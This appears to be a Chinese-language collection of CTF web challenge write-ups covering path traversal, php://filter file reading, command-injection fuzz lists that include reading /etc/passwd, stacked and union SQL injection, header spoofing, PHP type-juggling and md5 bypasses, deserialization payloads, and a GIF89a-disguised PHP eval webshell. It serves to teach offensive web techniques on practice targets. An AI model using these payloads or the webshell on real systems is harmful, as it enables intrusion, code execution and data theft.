# Web

## [HCTF 2018]WarmUp

#### 进入站点查看源码可以发现 source.php

![image-20230509225232784](CTF.assets/image-20230509225232784.png)

#### 访问 source.php 发现源码

>   这里有两个关键函数要弄懂

​			

##### `mb_substr`

###### 定义和用法

mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。

**注释：**如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。

---

###### 语法

```php
`mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string`
```





| 参数     | 描述                                                         |
| :------- | :----------------------------------------------------------- |
| *str*    | 必需。从该 string 中提取子字符串。                           |
| *start*  | 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始 |
| *length* | 可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回 |
| encoding | 可选。字符编码。如果省略，则使用内部字符编码。               |

##### `mb_substr`

###### 语法

```php
int mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] )
```

###### 定义和用法

-   `haystack`：要在其中查找子字符串的字符串。
-   `needle`：要查找的子字符串。
-   `offset`：查找的起始位置。如果设置了此参数，则函数将从字符串的此位置开始查找子字符串。如果未设置，则默认为 0。
-   `encoding`：要使用的字符编码。如果未设置，则默认使用 `mb_internal_encoding()` 返回的字符编码。

如果函数在 `haystack` 中找到了 `needle`，则返回其第一次出现的位置，以 0 开头的整数。如果未找到，则返回 `false`。

#### 网站源码

思路：在第13行不能直接返回，否则会直接返回到 hint.php。阅读 19-25 行代码，其中会对`$page`进行切割并覆盖。我们可以利用这一点来构造出`payload`

```php
<?php
class emmm
{
    public static function checkFile(&$page)
    {
        # 白名单
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
        if ( !isset($page) || !is_string($page)) {
            echo "you can't see it";
            return false;
        }
		# 这里不能直接返回
        if (in_array($page, $whitelist)) {
            return true;
        }

        # mb_substr(src, start, length)
        # 从 start 开始截取 字符串，截取长度：length
        $_page = mb_substr(
            $page,
            0,
            # mb_strpos(str, needle)
            # 返回 指定字符 在字符串中首次出现的位置
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        echo "you can't see it";
        return false;
    }
}

if ( !empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}
```



首先访问`hint.php`可以看出`flag`的位置

![image-20230509230821517](CTF.assets/image-20230509230821517.png)

最后得到`payload`

`file=hint.php?../../../../../../../ffffllllaaaagggg`

![image-20230509230945255](CTF.assets/image-20230509230945255.png)

## [ACTF2020 新生赛]Include - PHP伪协议

进入网站明显的 PHP 伪协议

<img src="CTF.assets/image-20230511231514373.png" alt="image-20230511231514373" style="zoom:50%;" />

使用 BuroSuite 对其进行模糊测试，下面是 字典

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/zlib.deflate/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://filter/read=string.tolower/resource=index.php
php://filter/read=string.strip_tags/resource=index.php
php://filter/read=convert.base64-decode/resource=index.php
php://filter/convert.base64-decode/resource=index.php
php://filter/read=convert.quoted-printable-decode/resource=index.php
php://filter/convert.quoted-printable-decode/resource=index.php
php://filter/convert.uuencode/resource=index.php
php://filter/read=convert.uuencode/resource=index.php
php://filter/convert.urlencode/resource=index.php
php://filter/read=convert.urlencode/resource=index.php
php://filter/gzip/convert.base64-encode/resource=index.php
php://filter/read=string.toupper|convert.base64-encode/resource=index.php
php://filter/read=string.tolower|convert.base64-encode/resource=index.php
php://filter/read=string.rot13|convert.base64-encode/resource=index.php
php://filter/read=zlib.deflate|convert.base64-encode/resource=index.php
php://filter/zlib.deflate|convert.base64-encode/resource=index.php
php://filter/read=zlib.inflate/resource=index.php
php://filter/read=zlib.inflate/convert.base64-encode/resource=index.php
php://filter/zlib.inflate/convert.base64-encode/resource=index.php
php://filter/read=zlib.inflate/convert.base64-decode/resource=index.php
php://filter/zlib.inflate/convert.base64-decode/resource=index.php
php://filter/read=zlib.inflate/convert.quoted-printable-decode/resource=index.php
php://filter/zlib.inflate/convert.quoted-printable-decode/resource=index.php
php://filter/read=zlib.inflate|convert.base64-encode/resource=index.php
php://filter/zlib.inflate|convert.base64-encode/resource=index.php
php://filter/read=zlib.inflate|convert.base64-decode/resource=index.php
php://filter/zlib.inflate|convert.base64-decode/resource=index.php
php://filter/read=zlib.inflate|convert.quoted-printable-decode/resource=index.php
php://filter/zlib.inflate|convert.quoted-printable-decode/resource=index.php
php://filter/convert.base64-encode/resource=flag.php
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/zlib.deflate/convert.base64-encode/resource=flag.php
php://filter/zlib.deflate/resource=flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/read=string.toupper/resource=flag.php
php://filter/read=string.tolower/resource=flag.php
php://filter/read=string.strip_tags/resource=flag.php
php://filter/read=convert.base64-decode/resource=flag.php
php://filter/convert.base64-decode/resource=flag.php
php://filter/read=convert.quoted-printable-decode/resource=flag.php
php://filter/convert.quoted-printable-decode/resource=flag.php
php://filter/convert.uuencode/resource=flag.php
php://filter/read=convert.uuencode/resource=flag.php
php://filter/convert.urlencode/resource=flag.php
php://filter/read=convert.urlencode/resource=flag.php
php://filter/gzip/convert.base64-encode/resource=flag.php
php://filter/read=string.toupper|convert.base64-encode/resource=flag.php
php://filter/read=string.tolower|convert.base64-encode/resource=flag.php
php://filter/read=string.rot13|convert.base64-encode/resource=flag.php
php://filter/read=zlib.deflate|convert.base64-encode/resource=flag.php
php://filter/zlib.deflate|convert.base64-encode/resource=flag.php
php://filter/read=zlib.inflate/resource=flag.php
php://filter/read=zlib.inflate/convert.base64-encode/resource=flag.php
php://filter/zlib.inflate/convert.base64-encode/resource=flag.php
php://filter/read=zlib.inflate/convert.base64-decode/resource=flag.php
php://filter/zlib.inflate/convert.base64-decode/resource=flag.php
php://filter/read=zlib.inflate/convert.quoted-printable-decode/resource=flag.php
php://filter/zlib.inflate/convert.quoted-printable-decode/resource=flag.php
php://filter/read=zlib.inflate|convert.base64-encode/resource=flag.php
php://filter/zlib.inflate|convert.base64-encode/resource=flag.php
php://filter/read=zlib.inflate|convert.base64-decode/resource=flag.php
php://filter/zlib.inflate|convert.base64-decode/resource=flag.php
php://filter/read=zlib.inflate|convert.quoted-printable-decode/resource=flag.php
php://filter/zlib.inflate|convert.quoted-printable-decode/resource=flag.php
php://input
php://stdin
php://memory
php://temp
php://output
php://fd
php://data
php://filter/convert.base64-decode/resource=file:///etc/passwd
php://filter/convert.base64-decode/resource=php://input
php://filter/convert.base64-decode/resource=php://stdin
php://filter/convert.base64-decode/resource=php://memory
php://filter/convert.base64-decode/resource=php://temp
php://filter/convert.base64-decode/resource=php://output
php://filter/convert.base64-decode/resource=php://fd
php://filter/convert.base64-decode/resource=php://data
php://filter/read=convert.base64-decode/resource=file:///etc/passwd
php://filter/read=convert.base64-decode/resource=php://input
php://filter/read=convert.base64-decode/resource=php://stdin
php://filter/read=convert.base64-decode/resource=php://memory
php://filter/read=convert.base64-decode/resource=php://temp
php://filter/read=convert.base64-decode/resource=php://output
php://filter/read=convert.base64-decode/resource=php://fd
php://filter/read=convert.base64-decode
```

获得 flag Base64 编码，对其进行 Base64 解码即可

<img src="CTF.assets/image-20230511231715030.png" alt="image-20230511231715030" style="zoom:50%;" />

## [GXYCTF2019]Ping Ping Ping - 系统命令执行过滤绕过

首先使用 Burp Suite做模糊测试测试出能使用的命令拼接符，字典如下：

```
; whoami
&& whoami
|| whoami
& whoami
| whoami
; echo test
&& echo test
|| echo test
& echo test
| echo test
; cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd
& cat /etc/passwd
| cat /etc/passwd
; id
&& id
|| id
& id
| id
; pwd
&& pwd
|| pwd
& pwd
| pwd
; ls -la
&& ls -la
|| ls -la
& ls -la
| ls -la
; ps aux
&& ps aux
|| ps aux
& ps aux
| ps aux
; netstat -an
&& netstat -an
|| netstat -an
& netstat -an
| netstat -an
; ping -c 3 127.0.0.1
&& ping -c 3 127.0.0.1
|| ping -c 3 127.0.0.1
& ping -c 3 127.0.0.1
| ping -c 3 127.0.0.1
&\ls
&&\ls
|\ls
||\ls
;ls
;\ls
```

==效果==

<img src="CTF.assets/image-20230511233624153.png" alt="image-20230511233624153" style="zoom:50%;" />

后面发现空格对空格进行了绕过，得出payload如下

解释：$IFS$9 对空格进行绕过，使用反引号对`ls`进行包裹，使得`ls`命令得到的结果返回给`cat`进行二次操作

```
cat$IFS$9`ls`
```

Kali 效果展示





==Fuzz字典==

```
+
cat+`ls`
$
cat$`ls`
%09
cat%09`ls`
$IFS$9
cat$IFS$9`ls`
${IFS}
cat${IFS}`ls`
```

==flag输出==

<img src="CTF.assets/image-20230511234029608.png" alt="image-20230511234029608" style="zoom:50%;" />

## [强网杯 2019]随便注

#### 前置知识：堆叠注入

原理：通过使用`;`闭合前面的SQL语句。再在后面构造新的SQL语句

```SQL
mysql> select * from int_intruder where id=1;show tables;
+----+----------+----------+
| id | username | passwd   |
+----+----------+----------+
|  1 | jake     | Aa123456 |
+----+----------+----------+
1 row in set (0.01 sec)

+--------------------+
| Tables_in_intruder |
+--------------------+
| int_intruder       |
| str_intruder       |
+--------------------+
2 rows in set (0.00 sec)
```

#### 实战流程

通过常规`UNION`注入发现对SQL关键词进行了屏蔽

<img src="CTF.assets/image-20230512233852720.png" alt="image-20230512233852720" style="zoom: 67%;" />

通过观察过滤字符串发现并没有对`show`关键字进行过滤。此时可以尝试使用堆叠注入（成功输出表名）

+ payload：`1';show tables;#`

<img src="CTF.assets/image-20230512233953605.png" alt="image-20230512233953605" style="zoom:50%;" />

对`1919810931114514`进行字段查询（注意由于`1919810931114514`是由数字组成，所以查询时需要使用反引号进行包裹）

payload：``1';show columns from `1919810931114514`;#``

<img src="CTF.assets/image-20230512234232410.png" alt="image-20230512234232410" style="zoom:50%;" />

注意：对于`show`关键字的查询，最多只能查询到字段名，无法获取具体的值。所以此时需要另外想办法

+ 由于后台处理是查询`words`且查询的是`id`。所以这里的解法之一是：通过对两张表的名字互换并为`1919810931114514`添加`id`自增长字段以达到直接通过查询得到`flag`
+ payload：``1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;#``

<img src="CTF.assets/image-20230512234729114.png" alt="image-20230512234729114" style="zoom:50%;" />

直接查询1得到`flag`

<img src="CTF.assets/image-20230512234833080.png" alt="image-20230512234833080" style="zoom:50%;" />

## [极客大挑战 2019]Http

#### 前置知识：HTTP基本字段认识

+ HTTP协议中的`Referer`字段用于告知服务器当前请求来源于**哪一个网站或者哪一个网站**
+ HTTP协议中的`X-Forwarded-For`字段用于告知服务器当前请求来源于或者经过**哪一个IP地址**
+ HTTP协议中的`User-Agent`字段用于告知服务器当前请求的**客户端浏览器信息**、**客户端浏览器版本**、**客户端操作系统**

#### 实战流程

进入网站被告知不是来自`https://Sycsecret.buuoj.cn`，使用`Referer`进行绕过

payload：`Referer: https://Sycsecret.buuoj.cn`

<img src="CTF.assets/image-20230512235744243.png" alt="image-20230512235744243" style="zoom:50%;" />

绕过后被告知不是使用`Syclover`浏览器，通过修改`User-Agent`绕过

payload：`Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/98.0.4758.82`

<img src="CTF.assets/image-20230512235932204.png" alt="image-20230512235932204" style="zoom:50%;" />

绕过浏览器限制后被告知不是来自于本地网络访问，通过修改`X-Forwarded-Fo`绕过

payload：`X-Forwarded-For: 127.0.0.1`

<img src="CTF.assets/image-20230513000230387.png" alt="image-20230513000230387" style="zoom:50%;" />

## [极客大挑战 2019]Upload - GIF89a 头文件欺骗

#### 前置知识

##### GIF89a 头文件欺骗

在系统读取到`GIF89a`这个头文件代码之后，就会直接将该文件当成**图片文件**来处理，并且不会再对后续的内容做**安全过滤**

##### PHTML 后缀

`phtml`后缀是PHP2的后缀名，在PHP4以后都是直接使用`php`后缀名，但直到现在，`phtml`后缀任然有效

##### PHP木马的各种写法

```php
<?php eval($_POST['cmd']);?>

<% eval($_POST['cmd']);%>

<O>h=@eval($_POST['cmd']);</O>

<?="helloworld";?>

<script language="php">@eval($_POST['cmd']);</script>
```



#### 实战流程

##### 构造木马文件

```
GIF89a
<script language="php">@eval($_POST['cmd']);</script>
```

##### 使用bp拦截并修改数据包

将文件类型改为：image/jpeg 即可，`$_file` 在接收文件时，通过判断HTTP`Request`中的`Content-Type`来判断文件内容

<img src="CTF.assets/image-20230513204920661.png" alt="image-20230513204920661" style="zoom:50%;" />

##### 最后使用蚁剑连接即可

<img src="CTF.assets/image-20230513205010186.png" alt="image-20230513205010186" style="zoom:50%;" />

## [ACTF2020 新生赛]BackupFile - 备份文件

#### 前置知识

这题比较简单，利用的是PHP语言是一门弱语言类型这一特点



```php
<?php
$str = '123';
# 判断是否是数字
var_dump(intval($str));
var_dump($str == 123);
```

==输出==

```php
# 我们可以看出，即使 $str 是字符串，PHP一样可以把他判断为 int 类型，且跟 int:123 相等
D:\PHP\tmp.php:3:
int(123)
D:\PHP\tmp.php:4:
bool(true)
```

#### 实战流程

##### 寻找源文件

进入网站发现需要我们寻找源文件，这里直接使用bp做模糊测试即可

<img src="CTF.assets/image-20230513210004580.png" alt="image-20230513210004580" style="zoom:50%;" />

使用bp做模糊测试，加载PHP备份文件字典，注意取消`Payload Encodeing`

<img src="CTF.assets/image-20230513210114882.png" alt="image-20230513210114882" style="zoom:50%;" />

<img src="CTF.assets/image-20230513210132184.png" alt="image-20230513210132184" style="zoom:50%;" />

<img src="CTF.assets/image-20230513210150559.png" alt="image-20230513210150559" style="zoom:50%;" />

##### Payload

```
http://fd81ad6c-4bb4-47d8-bf46-d9a9f600ea58.node4.buuoj.cn:81/index.php?key=123
```

## [RoarCTF 2019]Easy Calc

#### 前置知识

##### `$_GET`绕过

```
对于$_GET的传参，在前面加空格或者'+'都不影响识别

一般输入：?num=123
D:\PHP\tmp.php:3:
array (size=1)
  'num' => string '123' (length=3)
  
空格输入：? num=123
D:\PHP\tmp.php:3:
array (size=1)
  'num' => string '123' (length=3)
  
+输入：?+num=123
D:\PHP\tmp.php:3:
array (size=1)
  'num' => string '123' (length=3)
```

##### `scandir()`

`scandir(目录路径)`：用于扫描文件目录所有的文件

##### `file_get_contents(文件路径)`

`file_get_contents(文件路径)`：用于读取文件内容

#### 实战流程

进入站点查看源文件，说明其中有WAF过滤并发现网页源码

<img src="CTF.assets/image-20230514165920207.png" alt="image-20230514165920207" style="zoom:50%;" />

从网页源码可以看出是有一个黑名单过滤的，但是这里的黑名单可以使用 ASCII 编码绕过

<img src="CTF.assets/image-20230514165941172.png" alt="image-20230514165941172" style="zoom:50%;" />

输入`?num=phpinfo()`查看发现疑似被WAF过滤

<img src="CTF.assets/image-20230514170151741.png" alt="image-20230514170151741" style="zoom:50%;" />

输入`? num=phpinfo()`成功绕过

<img src="CTF.assets/image-20230514170245267.png" alt="image-20230514170245267" style="zoom:50%;" />

再次查看源码，其实很明显，能作妖的地方只有`eval`函数，我们使用`scandir()`函数读取文件。发现flag

payload：`?%20num=var_dump(scandir(chr(47)))`这里的`chr(47)`等于`/`。即查看根目录的文件信息

<img src="CTF.assets/image-20230514170624273.png" alt="image-20230514170624273" style="zoom:50%;" />

使用`file_get_contents`读取文件内容

payload：`?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

这条payload = `?%20num=var_dump(file_get_contents('/f1agg'))`

<img src="CTF.assets/image-20230514171252435.png" alt="image-20230514171252435" style="zoom:50%;" />

## [极客大挑战 2019]BuyFlag

要成功获取到 POST 需要3个前提条件：

1. You must be a student from CUIT!!!
2. You must be answer the correct password!!!
3. FLAG NEED YOUR 100000000 MONEY

通过多次刷新可以发现Cookie字段，将cookie字段改为1，可成功得到学生身份（cookie不会在第一个数据包出现，所以记住：以后抓包不抓第一个数据包）

<img src="CTF.assets/image-20230514175345962.png" alt="image-20230514175345962" style="zoom:50%;" />

F12可查看网页源码，这里提示必须POST提交 money 和 password

<img src="CTF.assets/image-20230514175417121.png" alt="image-20230514175417121" style="zoom:50%;" />

POST payload：`password=404a&money=1e9`

password = 404a 以绕过函数`is_numeric()`的监测。money=1e9 使用科学计数法来绕过对money的长度检查<img src="CTF.assets/image-20230514175603654.png" alt="image-20230514175603654" style="zoom: 50%;" />

## [BJDCTF2020]Easy MD5

#### 前置知识：md5 函数绕过

##### md5($password,true)导致的注入

`select * from 'admin' where password=md5($pass,true)`

```
md5(string,raw)，第一个参数必填，第二个可选
当第二个参数默认不写为FALSE，就返回32位16进制的字符串
当第二个参数为TRUE，返回16位原始二进制格式的字符串
```

绕过原理：

`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是 `‘ or ‘6`，

而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是`select * from ‘admin’ where password=’’ or ‘6xxxxx’`

而`or ‘6xxxxx’` 在mysql判断里面，相当于or 1 ，即等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数


##### 数组绕过

md5()函数**无法处理数组**，如果传入的为数组，会返回`NULL`，所以两个数组经过加密后得到的都是NULL,也就是相等的

```php
<?php
$a = array('aaa');
$b = array('bbb');
# 判断两个数组的值是否相等
var_dump($a==$b);
# 由于md5函数无法处理数组，所以当md5函数对数组进行计算的时候，会返回空。以至于 $a=$b
@var_dump(md5($a) == md5($b));
```

==输出==

```php
D:\PHP\tmp.php:5:
bool(false)
D:\PHP\tmp.php:7:
bool(true)
```

##### 两个或三个等号时候可以采用碰撞的方法绕过

```php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    echo $flag;
}
```

PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0

```
QNKCDZO
0e830400451993494058024219903391
  
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
  
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
```

#### 实战流程

进入网站没有发现任何线索，抓包可也发现提示！

<img src="CTF.assets/image-20230515184612720.png" alt="image-20230515184612720" style="zoom:50%;" />

`select * from 'admin' where password=md5($pass,true)`这条代码是PHP的代码。在这里可以使用**md5万能密码**绕过。与PHP万能密码原理一样，都是通过构造类似`or 1=1`的恒真布尔判断。根据前置知识可以知道使用`ffifdyop`



成功绕过后进入一个新站点，查看源码可发现线索

<img src="CTF.assets/image-20230515185039454.png" alt="image-20230515185039454" style="zoom:50%;" />

判断条件是`$a != $b`并且`md5($a) == md5($b)`这里可以使用数组进行绕过，通过对数组赋予不同的值可使`$a != $b`为True。并且由于md5函数无法对数组进行计算，所以会直接返回`NULL`， 可使得`md5($a) == md5($b)`为True

<img src="CTF.assets/image-20230515185512978.png" alt="image-20230515185512978" style="zoom:50%;" />

进入站点之后其实原理都一样了，只不过这里需要使用POST提交

<img src="CTF.assets/image-20230515185631953.png" alt="image-20230515185631953" style="zoom:50%;" />



## [GXYCTF2019]BabySQli

### 前置知识

MySQL的联合查询如果where条件没有查到东西，那么就会返回union查询后的查询结果

```mysql
mysql> select * from user;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

# union 查询id=2，数据不存在，返沪呗查询内容本身
mysql> select * from user where id=2 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

# 以此就能做到伪造数据表的目的
mysql> select * from user where id=2 union select 1,'admin',md5(123456);
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

### 解题流程

***1. 进入网站***

进入网站发现是一个登录页面

<img src="CTF.assets/image-20230619005022656.png" alt="image-20230619005022656" style="zoom:50%;" />

***2. 尝试登录***

密码错误，可知账户名是：admin

<img src="CTF.assets/image-20230619005044847.png" alt="image-20230619005044847" style="zoom:50%;" />

***3. 查看源码***

查看源码发现一串字符串:``

|      | <!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--> |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

**![image-20230619005141904](CTF.assets/image-20230619005141904.png)**

发现SQL语句

```bash
import base64

data = "MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5"
data = base64.b32decode(data)
print(data)

b64 = base64.b64decode(data)
print(b64)

# 输出
C:\Python\python.exe "D:\Python\Linux 应急响应\test2.py" 
b'c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw=='
b"select * from user where username = '$name'"
```

***4. 尝试SQL注入***

经过测试，网站对`( ) or`进行了过滤，一旦出现这些字符串就无法进行注入，所以这里只能用：`union select`，但是网站本身的回显只有两种情况：`wrond user | worng pass`，所以没有办法做常规的联合注入

**4.1 union 注入**

首先先确定查询的列数，为3

<img src="CTF.assets/image-20230619010318839.png" alt="image-20230619010318839" style="zoom:50%;" />



假设第一列为用户名：`wrong user`

<img src="CTF.assets/image-20230619010423997.png" alt="image-20230619010423997" style="zoom:50%;" />

假设第二列为用户名：`wrong pass`，以此就可以推断出第二列是用户名。

<img src="CTF.assets/image-20230619010456788.png" alt="image-20230619010456788" style="zoom:50%;" />

**4.2 源码审计**

```bash
# 测试语句

# 当SQL语句是正确的时候，$res为TRUE
<?php
$db = mysqli_connect('127.0.0.1', 'root', 'root', 'intruder');
$sql = "select * from user where username='23456'";
$res = mysqli_query($db, $sql);
var_dump(boolval($res));

# 输出
D:\PHP\test.php:5:
bool(true)


# 当SQL语句是错误的时候，$res为False
<?php
$db = mysqli_connect('127.0.0.1', 'root', 'root', 'intruder');
$sql = "select * from user wh username='23456'";
$res = mysqli_query($db, $sql);
var_dump(boolval($res));

# 输出
D:\PHP\test.php:5:
bool(false)
```



```php
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Do you know who am I?</title>
<?php
require "config.php";
require "flag.php";
 
// 去除转义
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
        array_map('stripslashes_deep', $value) :
        stripslashes($value);
        return $value;
    }
 
    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
 
mysqli_query($con,'SET NAMES UTF8');
$name = $_POST['name'];
$password = $_POST['pw'];
$t_pw = md5($password);
# SQL语句执行
$sql = "select * from user where username = '".$name."'";
$result = mysqli_query($con, $sql);
 
# 输入过滤：( ) = or
if(preg_match("/\(|\)|\=|or/", $name)){
    die("do not hack me!");
}
else{
    # SQL语句执行错误，返回False
    if (!$result) {
        printf("Error: %s\n", mysqli_error($con));
        exit();
    }
    # SQL语句执行正确执行分支
    else{
        $arr = mysqli_fetch_row($result);
        # 匹配输入用户名是否是“admin”
        if($arr[1] == "admin"){
            # 匹配密码md5之后是否相同
            if(md5($password) == $arr[2]){
                echo $flag;
            }
            else{
                die("wrong pass!");
            }
        }
        else{
            die("wrong user!");
        }
    }
}
 
?>
```

**4.3 最后答案**

整个题目其实最难的点就是不知道密码做了MD5的操作，利用UNION查询查不到数据的时候会伪造一条数据的特点就可以绕过

```mysql
mysql> select * from user where id=2 union select 1,'admin',md5(123456);
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

python 计算`123456`的md5值

```py
import hashlib

data = '123456'
md5 = hashlib.md5(data.encode('utf-8'))
print(md5.hexdigest())

# 输出
e10adc3949ba59abbe56e057f20f883e
```



最后`payload`：`name=-1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'--+&pw=123456`

<img src="CTF.assets/image-20230619012842604.png" alt="image-20230619012842604" style="zoom:50%;" />

## [网鼎杯 2020 青龙组]AreUSerialz

### 前置知识

这题有3个解法：

1. 使用`\00`绕过
2. 使用PHP伪协议
3. 利用PHP7.1 x对属性类型不敏感

PHP 属性类型不敏感演示

```php
# 原题
<?php
class Test1{
    protected $str = '1';

    public function __destruct(){
        echo $this->str;
    }

}

$t = new Test1();
echo serialize($t);



# 直接将 protected 改成 public
<?php
class Test1
{
    public $str = '1';

    public function __destruct()
    {
        echo $this->str;
    }

}

$res = unserialize('O:5:"Test1":1:{s:3:"str";s:2:"10";}');

# 输出
10
```

### 解题流程

**1. 题目代码**

```bash
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    `protected` $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

	# op 必须要等于1
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

# 如果输入进来的字符串不在 ASCII码 32 - 125 的范围内，直接退出程序
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

**2. 解法一**

+ `op===2`，直接使用`'2'`就好
+ `is_vaild`函数，必须要求在ASCII码 32 - 125 的范围内

由于`%00`经过URL解码后不在规定范围之内，所以会被`is_vaild`拦截，这里网上的办法是：**利用大写S采用的16进制，来绕过is_valid中对空字节的检查。 //00 替换 %00 。**这里我也不能理解为什么最后要用S来代替s

最后payload：`O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:0:"";}`

**2. 解法二**

利用PHP7.1+对属性类型不敏感，直接将`protected`改为`public`，输出反序列字符串

payload：`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}`

**3. 解法三**

PHP伪协议

## [MRCTF2020]Ez_bypass

这题考的还是PHP弱语言类型，考的还是比较简单

### 前置知识

**PHP md5函数绕过**

`md5()`无法处理数组，所以会直接返回null，具体可看上面的Easy MD5

```php
<?php
$str[] = 'a';
var_dump(md5($str));

# 输出
NULL
```

**is_numeric 无法检测纯数字字符串**

```php
<?php
var_dump(is_numeric('123456'));

# 输出
bool(true)
```

### 解题流程

```php
<?php
include 'flag.php';
$flag = 'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if (isset($_GET['gg']) && isset($_GET['id'])) {
    $id = $_GET['id'];
    $gg = $_GET['gg'];
    # 绕过点1：md5 函数绕过，id 和 gg 都要是数组
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if (isset($_POST['passwd'])) {
            $passwd = $_POST['passwd'];
            # 绕过点2：要求 passwd 不是数字但是又要等于1234567
            if (!is_numeric($passwd)) {
                if ($passwd == 1234567) {
                    echo 'Good Job!';
                    highlight_file('flag.php');
                    die('By Retr_0');
                } else {
                    echo "can you think twice??";
                }
            } else {
                echo 'You can not get it !';
            }

        } else {
            die('only one way to get the flag');
        }
    } else {
        echo "You are not a real hacker!";
    }
} else {
    die('Please input first');

}
```

**payload：**

GET`?id[]=a&gg[]=b` POST：`passwd=1234567a`



## [极客大挑战 2019]HardSQL

